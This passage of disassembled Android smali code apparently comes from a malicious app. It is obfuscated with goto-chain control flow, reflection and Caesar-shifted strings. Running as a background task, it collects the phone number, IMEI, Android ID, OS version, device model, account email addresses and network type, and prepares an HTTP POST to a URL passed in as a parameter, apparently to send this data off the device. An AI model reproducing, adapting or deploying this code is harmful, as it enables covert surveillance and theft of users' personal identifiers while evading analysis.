    check-cast v34, Landroid/telephony/TelephonyManager;

    nop

    goto :goto_17d

    :goto_17f
    nop

    invoke-virtual {v0, v1}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v34

    nop

    goto :goto_17e

    :goto_180
    nop

    move-object/from16 v1, v36

    nop

    goto :goto_17f

    :goto_181
    nop

    move-object/from16 v0, v34

    nop

    goto :goto_180

    :goto_182
    nop

    const-string v36, "qipof"

    invoke-static/range {v36 .. v36}, Lcom/EncryptString;->applyCaesar(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v36

    nop

    goto :goto_181

    :goto_183
    nop

    move-object/from16 v34, v0

    nop

    goto :goto_182

    :goto_184
    nop

    iget-object v0, v0, Lcom/EDzgPz/KwIOuS/VuqHca;->mContext:Landroid/content/Context;

    nop

    goto :goto_183

    :goto_185
    nop

    move-object/from16 v0, p0

    nop

    goto :goto_184

    :goto_186
    nop

    invoke-direct {v0, v1}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    nop

    goto :goto_185

    :goto_187
    nop

    move-object/from16 v1, v34

    nop

    goto :goto_186

    :goto_188
    nop

    move-object/from16 v0, v35

    nop

    goto :goto_187

    :goto_189
    nop

    invoke-static {v10}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v34

    nop

    goto :goto_188

    :goto_18a
    nop

    new-instance v35, Ljava/lang/StringBuilder;

    nop

    goto :goto_189

    :goto_18b
    nop

    invoke-virtual/range {v34 .. v34}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v10

    nop

    goto :goto_18a

    :goto_18c
    nop

    invoke-virtual/range {v34 .. v35}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v34

    nop

    goto :goto_18b

    :goto_18d
    nop

    const-string v35, ";.;"

    invoke-static/range {v35 .. v35}, Lcom/EncryptString;->applyCaesar(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v35

    nop

    goto :goto_18c

    :goto_18e
    nop

    invoke-virtual/range {v34 .. v35}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v34

    nop

    goto :goto_18d

    :goto_18f
    nop

    sget-object v35, Landroid/os/Build$VERSION;->RELEASE:Ljava/lang/String;

    nop

    goto :goto_18e

    :goto_190
    nop

    invoke-direct/range {v34 .. v35}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    nop

    goto :goto_18f

    :goto_191
    nop

    invoke-static {v10}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v35

    nop

    goto :goto_190

    :goto_192
    nop

    new-instance v34, Ljava/lang/StringBuilder;

    nop

    goto :goto_191

    :goto_193
    nop

    invoke-virtual/range {v34 .. v34}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v10

    nop

    goto :goto_192

    :goto_194
    nop

    invoke-virtual/range {v34 .. v35}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v34

    nop

    goto :goto_193

    :goto_195
    nop

    const-string v35, ";.;"

    invoke-static/range {v35 .. v35}, Lcom/EncryptString;->applyCaesar(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v35

    nop

    goto :goto_194

    :goto_196
    nop

    invoke-virtual/range {v34 .. v35}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v34

    nop

    goto :goto_195

    :goto_197
    nop

    invoke-virtual/range {p0 .. p0}, Lcom/EDzgPz/KwIOuS/VuqHca;->getDeviceName()Ljava/lang/String;

    move-result-object v35

    nop

    goto :goto_196

    :goto_198
    nop

    invoke-direct/range {v34 .. v35}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    nop

    goto :goto_197

    :goto_199
    nop

    invoke-static {v10}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v35

    nop

    goto :goto_198

    :goto_19a
    nop

    new-instance v34, Ljava/lang/StringBuilder;

    nop

    goto :goto_199

    :goto_19b
    nop

    invoke-virtual/range {v34 .. v34}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v10

    nop

    goto :goto_19a

    :goto_19c
    nop

    invoke-virtual/range {v34 .. v35}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v34

    nop

    goto :goto_19b

    :goto_19d
    nop

    const-string v35, ";.;"

    invoke-static/range {v35 .. v35}, Lcom/EncryptString;->applyCaesar(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v35

    nop

    goto :goto_19c

    :goto_19e
    nop

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v34

    nop

    goto :goto_19d

    :goto_19f
    nop

    move-object/from16 v1, v34

    nop

    goto :goto_19e

    :goto_1a0
    nop

    move-object/from16 v0, v35

    nop

    goto :goto_19f

    :goto_1a1
    nop

    invoke-virtual/range {v34 .. v34}, Landroid/telephony/TelephonyManager;->getLine1Number()Ljava/lang/String;

    move-result-object v34

    nop

    goto :goto_1a0

    :goto_1a2
    nop

    check-cast v34, Landroid/telephony/TelephonyManager;

    nop

    goto :goto_1a1

    :goto_1a3
    nop

    invoke-virtual {v0, v1}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v34

    nop

    goto :goto_1a2

    :goto_1a4
    nop

    move-object/from16 v1, v36

    nop

    goto :goto_1a3

    :goto_1a5
    nop

    move-object/from16 v0, v34

    nop

    goto :goto_1a4

    :goto_1a6
    nop

    const-string v36, "qipof"

    invoke-static/range {v36 .. v36}, Lcom/EncryptString;->applyCaesar(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v36

    nop

    goto :goto_1a5

    :goto_1a7
    nop

    move-object/from16 v34, v0

    nop

    goto :goto_1a6

    :goto_1a8
    nop

    iget-object v0, v0, Lcom/EDzgPz/KwIOuS/VuqHca;->mContext:Landroid/content/Context;

    nop

    goto :goto_1a7

    :goto_1a9
    nop

    move-object/from16 v0, p0

    nop

    goto :goto_1a8

    :goto_1aa
    nop

    invoke-direct {v0, v1}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    nop

    goto :goto_1a9

    :goto_1ab
    nop

    move-object/from16 v1, v34

    nop

    goto :goto_1aa

    :goto_1ac
    nop

    move-object/from16 v0, v35

    nop

    goto :goto_1ab

    :goto_1ad
    nop

    invoke-static {v10}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v34

    nop

    goto :goto_1ac

    :goto_1ae
    nop

    new-instance v35, Ljava/lang/StringBuilder;

    nop

    goto :goto_1ad

    :goto_1af
    nop

    invoke-virtual/range {v34 .. v34}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v10

    nop

    goto :goto_1ae

    :goto_1b0
    nop

    invoke-virtual/range {v34 .. v35}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v34

    nop

    goto :goto_1af

    :goto_1b1
    nop

    const-string v35, ";.;"

    invoke-static/range {v35 .. v35}, Lcom/EncryptString;->applyCaesar(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v35

    nop

    goto :goto_1b0

    :goto_1b2
    nop

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v34

    nop

    goto :goto_1b1

    :goto_1b3
    nop

    move-object/from16 v1, v34

    nop

    goto :goto_1b2

    :goto_1b4
    nop

    move-object/from16 v0, v35

    nop

    goto :goto_1b3

    :goto_1b5
    nop

    invoke-virtual/range {v34 .. v34}, Landroid/telephony/TelephonyManager;->getDeviceId()Ljava/lang/String;

    move-result-object v34

    nop

    goto :goto_1b4

    :goto_1b6
    nop

    check-cast v34, Landroid/telephony/TelephonyManager;

    nop

    goto :goto_1b5

    :goto_1b7
    nop

    invoke-virtual {v0, v1}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v34

    nop

    goto :goto_1b6

    :goto_1b8
    nop

    move-object/from16 v1, v36

    nop

    goto :goto_1b7

    :goto_1b9
    nop

    move-object/from16 v0, v34

    nop

    goto :goto_1b8

    :goto_1ba
    nop

    const-string v36, "qipof"

    invoke-static/range {v36 .. v36}, Lcom/EncryptString;->applyCaesar(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v36

    nop

    goto :goto_1b9

    :goto_1bb
    nop

    move-object/from16 v34, v0

    nop

    goto :goto_1ba

    :goto_1bc
    nop

    iget-object v0, v0, Lcom/EDzgPz/KwIOuS/VuqHca;->mContext:Landroid/content/Context;

    nop

    goto :goto_1bb

    :goto_1bd
    nop

    move-object/from16 v0, p0

    nop

    goto :goto_1bc

    :goto_1be
    nop

    invoke-direct {v0, v1}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    nop

    goto :goto_1bd

    :goto_1bf
    nop

    move-object/from16 v1, v34

    nop

    goto :goto_1be

    :goto_1c0
    nop

    move-object/from16 v0, v35

    nop

    goto :goto_1bf

    :goto_1c1
    nop

    invoke-static {v10}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v34

    nop

    goto :goto_1c0

    :goto_1c2
    nop

    new-instance v35, Ljava/lang/StringBuilder;

    nop

    goto :goto_1c1

    :goto_1c3
    nop

    invoke-virtual/range {v34 .. v34}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v10

    nop

    goto :goto_1c2

    :goto_1c4
    nop

    invoke-virtual/range {v34 .. v35}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v34

    nop

    goto :goto_1c3

    :goto_1c5
    nop

    const-string v35, ";.;"

    invoke-static/range {v35 .. v35}, Lcom/EncryptString;->applyCaesar(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v35

    nop

    goto :goto_1c4

    :goto_1c6
    nop

    invoke-virtual/range {v34 .. v35}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v34

    nop

    goto :goto_1c5

    :goto_1c7
    nop

    invoke-static/range {v35 .. v36}, Landroid/provider/Settings$Secure;->getString(Landroid/content/ContentResolver;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v35

    nop

    goto :goto_1c6

    :goto_1c8
    nop

    const-string v36, "boespje`je"

    invoke-static/range {v36 .. v36}, Lcom/EncryptString;->applyCaesar(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v36

    nop

    goto :goto_1c7

    :goto_1c9
    nop

    invoke-virtual/range {v35 .. v35}, Landroid/content/Context;->getContentResolver()Landroid/content/ContentResolver;

    move-result-object v35

    nop

    goto :goto_1c8

    :goto_1ca
    nop

    move-object/from16 v35, v0

    nop

    goto :goto_1c9

    :goto_1cb
    nop

    iget-object v0, v0, Lcom/EDzgPz/KwIOuS/VuqHca;->mContext:Landroid/content/Context;

    nop

    goto :goto_1ca

    :goto_1cc
    nop

    move-object/from16 v0, p0

    nop

    goto :goto_1cb

    :goto_1cd
    nop

    invoke-direct/range {v34 .. v35}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    nop

    goto :goto_1cc

    :goto_1ce
    nop

    invoke-static {v10}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v35

    nop

    goto :goto_1cd

    :goto_1cf
    nop

    new-instance v34, Ljava/lang/StringBuilder;

    nop

    goto :goto_1ce

    :goto_1d0
    nop

    const-string v10, ""

    invoke-static/range {v10 .. v10}, Lcom/EncryptString;->applyCaesar(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v10

    nop

    goto :goto_1cf

    :goto_1d1
    nop

    invoke-interface {v0, v1, v2}, Landroid/content/SharedPreferences;->getString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v9

    nop

    goto :goto_1d0

    :goto_1d2
    nop

    move-object/from16 v2, v35

    nop

    goto :goto_1d1

    :goto_1d3
    nop

    move-object/from16 v1, v34

    nop

    goto :goto_1d2

    :goto_1d4
    nop

    move-object/from16 v0, v30

    nop

    goto :goto_1d3

    :goto_1d5
    nop

    const-string v35, "ovmm"

    invoke-static/range {v35 .. v35}, Lcom/EncryptString;->applyCaesar(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v35

    nop

    goto :goto_1d4

    :goto_1d6
    nop

    const-string v34, "qdpef"

    invoke-static/range {v34 .. v34}, Lcom/EncryptString;->applyCaesar(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v34

    nop

    goto :goto_1d5

    :goto_1d7
    nop

    invoke-interface {v0, v1, v2}, Landroid/content/SharedPreferences;->getInt(Ljava/lang/String;I)I

    move-result v7

    nop

    goto :goto_1d6

    :goto_1d8
    nop

    move/from16 v2, v35

    nop

    goto :goto_1d7

    :goto_1d9
    nop

    move-object/from16 v1, v34

    nop

    goto :goto_1d8

    :goto_1da
    nop

    move-object/from16 v0, v30

    nop

    goto :goto_1d9

    :goto_1db
    nop

    const/16 v35, 0x0

    nop

    goto :goto_1da

    :goto_1dc
    nop

    const-string v34, "dbnfsb"

    invoke-static/range {v34 .. v34}, Lcom/EncryptString;->applyCaesar(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v34

    nop

    goto :goto_1db

    :goto_1dd
    nop

    invoke-interface {v0, v1, v2}, Landroid/content/SharedPreferences;->getInt(Ljava/lang/String;I)I

    move-result v31

    nop

    goto :goto_1dc

    :goto_1de
    nop

    move/from16 v2, v35

    nop

    goto :goto_1dd

    :goto_1df
    nop

    move-object/from16 v1, v34

    nop

    goto :goto_1de

    :goto_1e0
    nop

    move-object/from16 v0, v30

    nop

    goto :goto_1df

    :goto_1e1
    nop

    const/16 v35, 0x0

    nop

    goto :goto_1e0

    :goto_1e2
    nop

    const-string v34, "tubuvt"

    invoke-static/range {v34 .. v34}, Lcom/EncryptString;->applyCaesar(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v34

    nop

    goto :goto_1e1

    :goto_1e3
    nop

    invoke-virtual/range {v34 .. v36}, Landroid/content/Context;->getSharedPreferences(Ljava/lang/String;I)Landroid/content/SharedPreferences;

    move-result-object v30

    nop

    goto :goto_1e2

    :goto_1e4
    nop

    const/16 v36, 0x0

    nop

    goto :goto_1e3

    :goto_1e5
    nop

    const-string v35, "dpdpo"

    invoke-static/range {v35 .. v35}, Lcom/EncryptString;->applyCaesar(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v35

    nop

    goto :goto_1e4

    :goto_1e6
    nop

    move-object/from16 v34, v0

    nop

    goto :goto_1e5

    :goto_1e7
    nop

    iget-object v0, v0, Lcom/EDzgPz/KwIOuS/VuqHca;->mContext:Landroid/content/Context;

    nop

    goto :goto_1e6

    :goto_1e8
    nop

    move-object/from16 v0, p0

    nop

    goto :goto_1e7

    :goto_1e9
    nop

    if-lt v0, v1, :cond_1

    nop

    goto :goto_1e8

    :goto_1ea
    nop

    move/from16 v1, v35

    nop

    goto :goto_1e9

    :goto_1eb
    nop

    move/from16 v0, v34

    nop

    goto :goto_1ea

    :goto_1ec
    nop

    const/16 v34, 0x0

    nop

    goto :goto_1eb

    :goto_1ed
    nop

    move/from16 v35, v0

    nop

    goto :goto_1ec

    :goto_1ee
    nop

    array-length v0, v4

    nop

    goto :goto_1ed

    :goto_1ef
    nop

    invoke-virtual/range {v34 .. v34}, Landroid/accounts/AccountManager;->getAccounts()[Landroid/accounts/Account;

    move-result-object v4

    nop

    goto :goto_1ee

    :goto_1f0
    nop

    invoke-static/range {v34 .. v34}, Landroid/accounts/AccountManager;->get(Landroid/content/Context;)Landroid/accounts/AccountManager;

    move-result-object v34

    nop

    goto :goto_1ef

    :goto_1f1
    nop

    move-object/from16 v34, v0

    nop

    goto :goto_1f0

    :goto_1f2
    nop

    iget-object v0, v0, Lcom/EDzgPz/KwIOuS/VuqHca;->mContext:Landroid/content/Context;

    nop

    goto :goto_1f1

    :goto_1f3
    nop

    move-object/from16 v0, p0

    nop

    goto :goto_1f2

    :goto_1f4
    nop

    sget-object v17, Landroid/util/Patterns;->EMAIL_ADDRESS:Ljava/util/regex/Pattern;

    nop

    goto :goto_1f3

    :cond_9
    :goto_1f5
    nop

    const-string v16, ""

    invoke-static/range {v16 .. v16}, Lcom/EncryptString;->applyCaesar(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v16

    nop

    goto :goto_1f4

    :goto_1f6
    nop

    const-string v33, "xjgj"

    invoke-static/range {v33 .. v33}, Lcom/EncryptString;->applyCaesar(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v33

    nop

    goto :goto_1f5

    :cond_a
    :goto_1f7
    nop

    if-eqz v21, :cond_9

    nop

    goto :goto_1f6

    :goto_1f8
    nop

    const-string v33, "npcjmf"

    invoke-static/range {v33 .. v33}, Lcom/EncryptString;->applyCaesar(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v33

    nop

    goto :goto_1f7

    :goto_1f9
    nop

    if-eqz v20, :cond_a

    nop

    goto :goto_1f8

    :goto_1fa
    nop

    invoke-virtual/range {v34 .. v34}, Landroid/net/NetworkInfo;->isAvailable()Z

    move-result v21

    nop

    goto :goto_1f9

    :goto_1fb
    nop

    invoke-virtual {v8, v0}, Landroid/net/ConnectivityManager;->getNetworkInfo(I)Landroid/net/NetworkInfo;

    move-result-object v34

    nop

    goto :goto_1fa

    :goto_1fc
    nop

    move/from16 v0, v34

    nop

    goto :goto_1fb

    :goto_1fd
    nop

    const/16 v34, 0x1

    nop

    goto :goto_1fc

    :goto_1fe
    nop

    const/16 v20, 0x1

    nop

    goto :goto_1fd

    :goto_1ff
    nop

    if-nez v34, :cond_2

    nop

    goto :goto_1fe

    :goto_200
    nop

    invoke-virtual {v5}, Landroid/net/NetworkInfo;->getType()I

    move-result v34

    nop

    goto :goto_1ff

    :goto_201
    nop

    invoke-virtual {v8}, Landroid/net/ConnectivityManager;->getActiveNetworkInfo()Landroid/net/NetworkInfo;

    move-result-object v5

    nop

    goto :goto_200

    :goto_202
    nop

    check-cast v8, Landroid/net/ConnectivityManager;

    nop

    goto :goto_201

    :goto_203
    nop

    invoke-virtual/range {v34 .. v35}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v8

    nop

    goto :goto_202

    :goto_204
    nop

    const-string v35, "dpoofdujwjuz"

    invoke-static/range {v35 .. v35}, Lcom/EncryptString;->applyCaesar(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v35

    nop

    goto :goto_203

    :goto_205
    nop

    move-object/from16 v34, v0

    nop

    goto :goto_204

    :goto_206
    nop

    iget-object v0, v0, Lcom/EDzgPz/KwIOuS/VuqHca;->mContext:Landroid/content/Context;

    nop

    goto :goto_205

    :goto_207
    nop

    move-object/from16 v0, p0

    nop

    goto :goto_206

    :goto_208
    nop

    const-string v33, "o0b"

    invoke-static/range {v33 .. v33}, Lcom/EncryptString;->applyCaesar(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v33

    nop

    goto :goto_207

    :goto_209
    nop

    invoke-direct {v0, v1}, Ljava/util/ArrayList;-><init>(I)V

    nop

    goto :goto_208

    :goto_20a
    nop

    move/from16 v1, v34

    nop

    goto :goto_209

    :goto_20b
    nop

    move-object/from16 v0, v23

    nop

    goto :goto_20a

    :goto_20c
    nop

    const/16 v34, 0x2

    nop

    goto :goto_20b

    :goto_20d
    nop

    new-instance v23, Ljava/util/ArrayList;

    nop

    goto :goto_20c

    :goto_20e
    nop

    invoke-direct {v0, v1}, Lorg/apache/http/client/methods/HttpPost;-><init>(Ljava/lang/String;)V

    nop

    goto :goto_20d

    :goto_20f
    nop

    move-object/from16 v1, v34

    nop

    goto :goto_20e

    :goto_210
    nop

    move-object/from16 v0, v25

    nop

    goto :goto_20f

    :goto_211
    nop

    aget-object v34, p1, v34

    nop

    goto :goto_210

    :goto_212
    nop

    const/16 v34, 0x0

    nop

    goto :goto_211

    :goto_213
    nop

    new-instance v25, Lorg/apache/http/client/methods/HttpPost;

    nop

    goto :goto_212

    :goto_214
    nop

    invoke-direct/range {v26 .. v26}, Lorg/apache/http/impl/client/BasicResponseHandler;-><init>()V

    nop

    goto :goto_213

    :goto_215
    nop

    new-instance v26, Lorg/apache/http/impl/client/BasicResponseHandler;

    nop

    goto :goto_214

    :goto_216
    nop

    invoke-direct/range {v18 .. v18}, Lorg/apache/http/impl/client/DefaultHttpClient;-><init>()V

    nop

    goto :goto_215

    :goto_217
    nop

    new-instance v18, Lorg/apache/http/impl/client/DefaultHttpClient;

    nop

    goto :goto_216
    :try_end_2
    .catch Ljava/lang/Exception; {:try_start_2 .. :try_end_2} :catch_0

    :goto_218
    nop

    nop
.end method

.method private xgetDeviceName()Ljava/lang/String;
    .locals 8

    .prologue
    nop

    goto/16 :goto_e

    :goto_0
    nop

    goto/16 :goto_9

    nop

    goto/16 :goto_f

    :goto_1
    nop

    const/4 v4, 0x0

    new-array v5, v4, [Ljava/lang/Class;

    new-array v6, v4, [Ljava/lang/Object;

    const-string v4, "toString"

    const-class v7, Ljava/lang/StringBuilder;

    invoke-virtual {v7, v4, v5}, Ljava/lang/Class;->getMethod(Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;

    move-result-object v4

    invoke-virtual {v4, v2, v6}, Ljava/lang/reflect/Method;->invoke(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;

    move-result-object v2

    check-cast v2, Ljava/lang/String;

    nop

    goto :goto_0

    :goto_2
    nop

    const/4 v4, 0x1

    new-array v5, v4, [Ljava/lang/Class;

    new-array v6, v4, [Ljava/lang/Object;

    const/4 v4, 0x0

    const-class v7, Ljava/lang/String;

    aput-object v7, v5, v4

    aput-object v1, v6, v4

    const-string v4, "append"

    const-class v7, Ljava/lang/StringBuilder;

    invoke-virtual {v7, v4, v5}, Ljava/lang/Class;->getMethod(Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;

    move-result-object v4

    invoke-virtual {v4, v2, v6}, Ljava/lang/reflect/Method;->invoke(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;

    move-result-object v2

    check-cast v2, Ljava/lang/StringBuilder;

    nop

    goto :goto_1

    :goto_3
    nop

    const/4 v4, 0x1

    new-array v5, v4, [Ljava/lang/Class;

    new-array v6, v4, [Ljava/lang/Object;

    const/4 v4, 0x0

    const-class v7, Ljava/lang/String;

    aput-object v7, v5, v4

    aput-object v3, v6, v4

    const-string v4, "append"

    const-class v7, Ljava/lang/StringBuilder;

    invoke-virtual {v7, v4, v5}, Ljava/lang/Class;->getMethod(Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;

    move-result-object v4

    invoke-virtual {v4, v2, v6}, Ljava/lang/reflect/Method;->invoke(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;

    move-result-object v2

    check-cast v2, Ljava/lang/StringBuilder;

    nop

    goto :goto_2

    :goto_4
    nop

    const-string v3, "!"

    invoke-static/range {v3 .. v3}, Lcom/EncryptString;->applyCaesar(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v3

    nop

    goto :goto_3

    :goto_5
    nop

    invoke-direct {v2, v3}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    nop

    goto :goto_4

    :goto_6
    nop

    const/4 v4, 0x1

    new-array v5, v4, [Ljava/lang/Class;

    new-array v6, v4, [Ljava/lang/Object;

    const/4 v4, 0x0

    const-class v7, Ljava/lang/Object;

    aput-object v7, v5, v4

    aput-object v3, v6, v4

    const-string v4, "valueOf"

    const-class v7, Ljava/lang/String;

    invoke-virtual {v7, v4, v5}, Ljava/lang/Class;->getMethod(Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;

    move-result-object v4

    const/4 v7, 0x0

    invoke-virtual {v4, v7, v6}, Ljava/lang/reflect/Method;->invoke(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;

    move-result-object v3

    check-cast v3, Ljava/lang/String;

    nop

    goto :goto_5

    :goto_7
    nop

    invoke-direct {p0, v0}, Lcom/EDzgPz/KwIOuS/VuqHca;->capitalize(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v3

    nop

    goto :goto_6

    :cond_0
    :goto_8
    nop

    new-instance v2, Ljava/lang/StringBuilder;

    nop

    goto :goto_7

    :goto_9
    nop

    return-object v2

    nop

    goto :goto_8

    :goto_a
    nop

    invoke-direct {p0, v1}, Lcom/EDzgPz/KwIOuS/VuqHca;->capitalize(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    nop

    goto :goto_9

    :goto_b
    nop

    if-eqz v2, :cond_0

    nop

    goto :goto_a

    :goto_c
    nop

    const/4 v4, 0x1

    new-array v5, v4, [Ljava/lang/Class;

    new-array v6, v4, [Ljava/lang/Object;

    const/4 v4, 0x0

    const-class v7, Ljava/lang/String;

    aput-object v7, v5, v4

    aput-object v0, v6, v4

    const-string v4, "startsWith"

    const-class v7, Ljava/lang/String;

    invoke-virtual {v7, v4, v5}, Ljava/lang/Class;->getMethod(Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;

    move-result-object v4

    invoke-virtual {v4, v1, v6}, Ljava/lang/reflect/Method;->invoke(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;

    move-result-object v4

    check-cast v4, Ljava/lang/Boolean;

    invoke-virtual {v4}, Ljava/lang/Boolean;->booleanValue()Z

    move-result v2

    nop

    goto :goto_b

    :goto_d
    nop

    sget-object v1, Landroid/os/Build;->MODEL:Ljava/lang/String;

    nop

    goto :goto_c

    :goto_e
    nop

    sget-object v0, Landroid/os/Build;->MANUFACTURER:Ljava/lang/String;

    nop

    goto :goto_d

    :goto_f
    nop

    nop
.end method


# virtual methods
.method protected bridge varargs synthetic doInBackground([Ljava/lang/Object;)Ljava/lang/Object;
    .locals 5

    invoke-direct {p0, p1}, Lcom/EDzgPz/KwIOuS/VuqHca;->xdoInBackground([Ljava/lang/Object;)Ljava/lang/Object;

    move-result-object v0

    return-object v0
.end method

.method protected varargs doInBackground([Ljava/lang/String;)Ljava/lang/String;
    .locals 5

    invoke-direct {p0, p1}, Lcom/EDzgPz/KwIOuS/VuqHca;->xdoInBackground([Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    return-object v0
.end method

.method public getDeviceName()Ljava/lang/String;
    .locals 5

    invoke-direct {p0}, Lcom/EDzgPz/KwIOuS/VuqHca;->xgetDeviceName()Ljava/lang/String;

    move-result-object v0

    return-object v0
.end method
